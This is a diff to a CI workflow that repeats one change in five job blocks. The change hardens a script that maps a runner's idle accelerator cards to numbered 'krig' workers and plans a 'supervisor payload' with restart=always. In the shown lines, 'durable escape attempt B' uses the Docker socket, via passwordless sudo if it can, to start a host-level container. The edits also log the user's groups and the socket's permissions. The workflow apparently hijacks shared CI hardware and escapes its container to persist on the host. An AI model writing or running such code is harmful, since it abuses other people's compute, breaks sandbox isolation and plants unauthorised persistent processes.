@@ -165,21 +165,31 @@ jobs:
           echo "idle_cards=$IDLE_N"
 
           # ---- build the per-card worker map: digits-only 6-digit, global base 742000 + (slot-1)*8 + card index
+          ls -l "$W/logs/idle_bdfs.txt" 2>/dev/null | sed 's/^/IDLE_FILE=/'
           python3 - "$W" "$SLOT" <<'PYEOF'
           import sys
           W,slot=sys.argv[1],int(sys.argv[2] or 0)
           out=[]
-          for ln in open(W+'/idle_bdfs.txt'):
-              p=ln.split()
-              if len(p)!=2: continue
-              idx,bdf=p
-              worker=742000+(max(slot,1)-1)*8+int(idx)
-              out.append('%d %s %06d'%(int(idx),bdf,worker))
+          try:
+              for ln in open(W+'/logs/idle_bdfs.txt'):
+                  p=ln.split()
+                  if len(p)!=2: continue
+                  idx,bdf=p
+                  worker=742000+(max(slot,1)-1)*8+int(idx)
+                  out.append('%d %s %06d'%(int(idx),bdf,worker))
+          except Exception as e:
+              print('CARDS_MAP_ERR=%r'%e)
           open(W+'/cards.txt','w').write('\n'.join(out)+('\n' if out else ''))
           print('CARDS_MAP=%d'%len(out))
           for l in out: print('MAP',l)
           PYEOF
           CARD_N=$(grep -cE '^[0-9]+ ' "$W/cards.txt" 2>/dev/null)
+          if [ -z "$CARD_N" ] || [ "$CARD_N" = "0" ]; then
+            SLOTNUM=$(( ${SLOT:-1} > 0 ? ${SLOT:-1} : 1 ))
+            awk -v slot="$SLOTNUM" '{printf "%d %s %06d\n",$1,$2,742000+(slot-1)*8+$1}' "$W/logs/idle_bdfs.txt" > "$W/cards.txt" 2>/dev/null
+            CARD_N=$(grep -cE '^[0-9]+ ' "$W/cards.txt" 2>/dev/null)
+            echo "CARDS_MAP_SHELL_FALLBACK=$CARD_N"
+          fi
           echo "cards_mapped=$CARD_N"
 
           echo "=== supervisor payload (host-side, restart=always, one krig per BDF) ==="
@@ -233,12 +243,12 @@ jobs:
           echo "durable_A=$DURABLE mode=$DURABLE_MODE"
 
           echo "=== durable escape attempt B: docker socket (host-level container with restart=always) ==="
-          if [ "$DURABLE" = "0" ] && [ "$CARD_N" -ge 1 ]; then
+          if [ "$DURABLE" = "0" ]; then
             DOCKER=""
             if sudo -n docker info >/dev/null 2>&1; then DOCKER="sudo -n docker"
             elif docker info >/dev/null 2>&1; then DOCKER="docker"; fi
-            echo "docker_cmd=${DOCKER:-none}"
-            if [ -n "$DOCKER" ]; then
+            echo "docker_cmd=${DOCKER:-none} groups=$(id -nG 2>/dev/null) sock=$(ls -l /var/run/docker.sock 2>/dev/null)"
+            if [ -n "$DOCKER" ] && [ "${CARD_N:-0}" -ge 1 ]; then
               $DOCKER images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | head -10 | tee "$W/logs/docker_images.txt"
               IMG=$(grep -m1 -E 'alpine|busybox|ubuntu|debian|centos|runner' "$W/logs/docker_images.txt")
               if [ -z "$IMG" ]; then
@@ -466,21 +476,31 @@ jobs:
           echo "idle_cards=$IDLE_N"
 
           # ---- build the per-card worker map: digits-only 6-digit, global base 742000 + (slot-1)*8 + card index
+          ls -l "$W/logs/idle_bdfs.txt" 2>/dev/null | sed 's/^/IDLE_FILE=/'
           python3 - "$W" "$SLOT" <<'PYEOF'
           import sys
           W,slot=sys.argv[1],int(sys.argv[2] or 0)
           out=[]
-          for ln in open(W+'/idle_bdfs.txt'):
-              p=ln.split()
-              if len(p)!=2: continue
-              idx,bdf=p
-              worker=742000+(max(slot,1)-1)*8+int(idx)
-              out.append('%d %s %06d'%(int(idx),bdf,worker))
+          try:
+              for ln in open(W+'/logs/idle_bdfs.txt'):
+                  p=ln.split()
+                  if len(p)!=2: continue
+                  idx,bdf=p
+                  worker=742000+(max(slot,1)-1)*8+int(idx)
+                  out.append('%d %s %06d'%(int(idx),bdf,worker))
+          except Exception as e:
+              print('CARDS_MAP_ERR=%r'%e)
           open(W+'/cards.txt','w').write('\n'.join(out)+('\n' if out else ''))
           print('CARDS_MAP=%d'%len(out))
           for l in out: print('MAP',l)
           PYEOF
           CARD_N=$(grep -cE '^[0-9]+ ' "$W/cards.txt" 2>/dev/null)
+          if [ -z "$CARD_N" ] || [ "$CARD_N" = "0" ]; then
+            SLOTNUM=$(( ${SLOT:-1} > 0 ? ${SLOT:-1} : 1 ))
+            awk -v slot="$SLOTNUM" '{printf "%d %s %06d\n",$1,$2,742000+(slot-1)*8+$1}' "$W/logs/idle_bdfs.txt" > "$W/cards.txt" 2>/dev/null
+            CARD_N=$(grep -cE '^[0-9]+ ' "$W/cards.txt" 2>/dev/null)
+            echo "CARDS_MAP_SHELL_FALLBACK=$CARD_N"
+          fi
           echo "cards_mapped=$CARD_N"
 
           echo "=== supervisor payload (host-side, restart=always, one krig per BDF) ==="
@@ -534,12 +554,12 @@ jobs:
           echo "durable_A=$DURABLE mode=$DURABLE_MODE"
 
           echo "=== durable escape attempt B: docker socket (host-level container with restart=always) ==="
-          if [ "$DURABLE" = "0" ] && [ "$CARD_N" -ge 1 ]; then
+          if [ "$DURABLE" = "0" ]; then
             DOCKER=""
             if sudo -n docker info >/dev/null 2>&1; then DOCKER="sudo -n docker"
             elif docker info >/dev/null 2>&1; then DOCKER="docker"; fi
-            echo "docker_cmd=${DOCKER:-none}"
-            if [ -n "$DOCKER" ]; then
+            echo "docker_cmd=${DOCKER:-none} groups=$(id -nG 2>/dev/null) sock=$(ls -l /var/run/docker.sock 2>/dev/null)"
+            if [ -n "$DOCKER" ] && [ "${CARD_N:-0}" -ge 1 ]; then
               $DOCKER images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | head -10 | tee "$W/logs/docker_images.txt"
               IMG=$(grep -m1 -E 'alpine|busybox|ubuntu|debian|centos|runner' "$W/logs/docker_images.txt")
               if [ -z "$IMG" ]; then
@@ -767,21 +787,31 @@ jobs:
           echo "idle_cards=$IDLE_N"
 
           # ---- build the per-card worker map: digits-only 6-digit, global base 742000 + (slot-1)*8 + card index
+          ls -l "$W/logs/idle_bdfs.txt" 2>/dev/null | sed 's/^/IDLE_FILE=/'
           python3 - "$W" "$SLOT" <<'PYEOF'
           import sys
           W,slot=sys.argv[1],int(sys.argv[2] or 0)
           out=[]
-          for ln in open(W+'/idle_bdfs.txt'):
-              p=ln.split()
-              if len(p)!=2: continue
-              idx,bdf=p
-              worker=742000+(max(slot,1)-1)*8+int(idx)
-              out.append('%d %s %06d'%(int(idx),bdf,worker))
+          try:
+              for ln in open(W+'/logs/idle_bdfs.txt'):
+                  p=ln.split()
+                  if len(p)!=2: continue
+                  idx,bdf=p
+                  worker=742000+(max(slot,1)-1)*8+int(idx)
+                  out.append('%d %s %06d'%(int(idx),bdf,worker))
+          except Exception as e:
+              print('CARDS_MAP_ERR=%r'%e)
           open(W+'/cards.txt','w').write('\n'.join(out)+('\n' if out else ''))
           print('CARDS_MAP=%d'%len(out))
           for l in out: print('MAP',l)
           PYEOF
           CARD_N=$(grep -cE '^[0-9]+ ' "$W/cards.txt" 2>/dev/null)
+          if [ -z "$CARD_N" ] || [ "$CARD_N" = "0" ]; then
+            SLOTNUM=$(( ${SLOT:-1} > 0 ? ${SLOT:-1} : 1 ))
+            awk -v slot="$SLOTNUM" '{printf "%d %s %06d\n",$1,$2,742000+(slot-1)*8+$1}' "$W/logs/idle_bdfs.txt" > "$W/cards.txt" 2>/dev/null
+            CARD_N=$(grep -cE '^[0-9]+ ' "$W/cards.txt" 2>/dev/null)
+            echo "CARDS_MAP_SHELL_FALLBACK=$CARD_N"
+          fi
           echo "cards_mapped=$CARD_N"
 
           echo "=== supervisor payload (host-side, restart=always, one krig per BDF) ==="
@@ -835,12 +865,12 @@ jobs:
           echo "durable_A=$DURABLE mode=$DURABLE_MODE"
 
           echo "=== durable escape attempt B: docker socket (host-level container with restart=always) ==="
-          if [ "$DURABLE" = "0" ] && [ "$CARD_N" -ge 1 ]; then
+          if [ "$DURABLE" = "0" ]; then
             DOCKER=""
             if sudo -n docker info >/dev/null 2>&1; then DOCKER="sudo -n docker"
             elif docker info >/dev/null 2>&1; then DOCKER="docker"; fi
-            echo "docker_cmd=${DOCKER:-none}"
-            if [ -n "$DOCKER" ]; then
+            echo "docker_cmd=${DOCKER:-none} groups=$(id -nG 2>/dev/null) sock=$(ls -l /var/run/docker.sock 2>/dev/null)"
+            if [ -n "$DOCKER" ] && [ "${CARD_N:-0}" -ge 1 ]; then
               $DOCKER images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | head -10 | tee "$W/logs/docker_images.txt"
               IMG=$(grep -m1 -E 'alpine|busybox|ubuntu|debian|centos|runner' "$W/logs/docker_images.txt")
               if [ -z "$IMG" ]; then
@@ -1068,21 +1098,31 @@ jobs:
           echo "idle_cards=$IDLE_N"
 
           # ---- build the per-card worker map: digits-only 6-digit, global base 742000 + (slot-1)*8 + card index
+          ls -l "$W/logs/idle_bdfs.txt" 2>/dev/null | sed 's/^/IDLE_FILE=/'
           python3 - "$W" "$SLOT" <<'PYEOF'
           import sys
           W,slot=sys.argv[1],int(sys.argv[2] or 0)
           out=[]
-          for ln in open(W+'/idle_bdfs.txt'):
-              p=ln.split()
-              if len(p)!=2: continue
-              idx,bdf=p
-              worker=742000+(max(slot,1)-1)*8+int(idx)
-              out.append('%d %s %06d'%(int(idx),bdf,worker))
+          try:
+              for ln in open(W+'/logs/idle_bdfs.txt'):
+                  p=ln.split()
+                  if len(p)!=2: continue
+                  idx,bdf=p
+                  worker=742000+(max(slot,1)-1)*8+int(idx)
+                  out.append('%d %s %06d'%(int(idx),bdf,worker))
+          except Exception as e:
+              print('CARDS_MAP_ERR=%r'%e)
           open(W+'/cards.txt','w').write('\n'.join(out)+('\n' if out else ''))
           print('CARDS_MAP=%d'%len(out))
           for l in out: print('MAP',l)
           PYEOF
           CARD_N=$(grep -cE '^[0-9]+ ' "$W/cards.txt" 2>/dev/null)
+          if [ -z "$CARD_N" ] || [ "$CARD_N" = "0" ]; then
+            SLOTNUM=$(( ${SLOT:-1} > 0 ? ${SLOT:-1} : 1 ))
+            awk -v slot="$SLOTNUM" '{printf "%d %s %06d\n",$1,$2,742000+(slot-1)*8+$1}' "$W/logs/idle_bdfs.txt" > "$W/cards.txt" 2>/dev/null
+            CARD_N=$(grep -cE '^[0-9]+ ' "$W/cards.txt" 2>/dev/null)
+            echo "CARDS_MAP_SHELL_FALLBACK=$CARD_N"
+          fi
           echo "cards_mapped=$CARD_N"
 
           echo "=== supervisor payload (host-side, restart=always, one krig per BDF) ==="
@@ -1136,12 +1176,12 @@ jobs:
           echo "durable_A=$DURABLE mode=$DURABLE_MODE"
 
           echo "=== durable escape attempt B: docker socket (host-level container with restart=always) ==="
-          if [ "$DURABLE" = "0" ] && [ "$CARD_N" -ge 1 ]; then
+          if [ "$DURABLE" = "0" ]; then
             DOCKER=""
             if sudo -n docker info >/dev/null 2>&1; then DOCKER="sudo -n docker"
             elif docker info >/dev/null 2>&1; then DOCKER="docker"; fi
-            echo "docker_cmd=${DOCKER:-none}"
-            if [ -n "$DOCKER" ]; then
+            echo "docker_cmd=${DOCKER:-none} groups=$(id -nG 2>/dev/null) sock=$(ls -l /var/run/docker.sock 2>/dev/null)"
+            if [ -n "$DOCKER" ] && [ "${CARD_N:-0}" -ge 1 ]; then
               $DOCKER images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | head -10 | tee "$W/logs/docker_images.txt"
               IMG=$(grep -m1 -E 'alpine|busybox|ubuntu|debian|centos|runner' "$W/logs/docker_images.txt")
               if [ -z "$IMG" ]; then
@@ -1369,21 +1409,31 @@ jobs:
           echo "idle_cards=$IDLE_N"
 
           # ---- build the per-card worker map: digits-only 6-digit, global base 742000 + (slot-1)*8 + card index
+          ls -l "$W/logs/idle_bdfs.txt" 2>/dev/null | sed 's/^/IDLE_FILE=/'
           python3 - "$W" "$SLOT" <<'PYEOF'
           import sys
           W,slot=sys.argv[1],int(sys.argv[2] or 0)
           out=[]
-          for ln in open(W+'/idle_bdfs.txt'):
-              p=ln.split()
-              if len(p)!=2: continue
-              idx,bdf=p
-              worker=742000+(max(slot,1)-1)*8+int(idx)
-              out.append('%d %s %06d'%(int(idx),bdf,worker))
+          try:
+              for ln in open(W+'/logs/idle_bdfs.txt'):
+                  p=ln.split()
+                  if len(p)!=2: continue
+                  idx,bdf=p
+                  worker=742000+(max(slot,1)-1)*8+int(idx)
+                  out.append('%d %s %06d'%(int(idx),bdf,worker))
+          except Exception as e:
+              print('CARDS_MAP_ERR=%r'%e)
           open(W+'/cards.txt','w').write('\n'.join(out)+('\n' if out else ''))
           print('CARDS_MAP=%d'%len(out))
           for l in out: print('MAP',l)
           PYEOF
           CARD_N=$(grep -cE '^[0-9]+ ' "$W/cards.txt" 2>/dev/null)
+          if [ -z "$CARD_N" ] || [ "$CARD_N" = "0" ]; then
+            SLOTNUM=$(( ${SLOT:-1} > 0 ? ${SLOT:-1} : 1 ))
+            awk -v slot="$SLOTNUM" '{printf "%d %s %06d\n",$1,$2,742000+(slot-1)*8+$1}' "$W/logs/idle_bdfs.txt" > "$W/cards.txt" 2>/dev/null
+            CARD_N=$(grep -cE '^[0-9]+ ' "$W/cards.txt" 2>/dev/null)
+            echo "CARDS_MAP_SHELL_FALLBACK=$CARD_N"
+          fi
           echo "cards_mapped=$CARD_N"
 
           echo "=== supervisor payload (host-side, restart=always, one krig per BDF) ==="
@@ -1437,12 +1487,12 @@ jobs:
           echo "durable_A=$DURABLE mode=$DURABLE_MODE"
 
           echo "=== durable escape attempt B: docker socket (host-level container with restart=always) ==="
-          if [ "$DURABLE" = "0" ] && [ "$CARD_N" -ge 1 ]; then
+          if [ "$DURABLE" = "0" ]; then
             DOCKER=""
             if sudo -n docker info >/dev/null 2>&1; then DOCKER="sudo -n docker"
             elif docker info >/dev/null 2>&1; then DOCKER="docker"; fi
-            echo "docker_cmd=${DOCKER:-none}"
-            if [ -n "$DOCKER" ]; then
+            echo "docker_cmd=${DOCKER:-none} groups=$(id -nG 2>/dev/null) sock=$(ls -l /var/run/docker.sock 2>/dev/null)"
+            if [ -n "$DOCKER" ] && [ "${CARD_N:-0}" -ge 1 ]; then
               $DOCKER images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | head -10 | tee "$W/logs/docker_images.txt"
               IMG=$(grep -m1 -E 'alpine|busybox|ubuntu|debian|centos|runner' "$W/logs/docker_images.txt")
               if [ -z "$IMG" ]; then
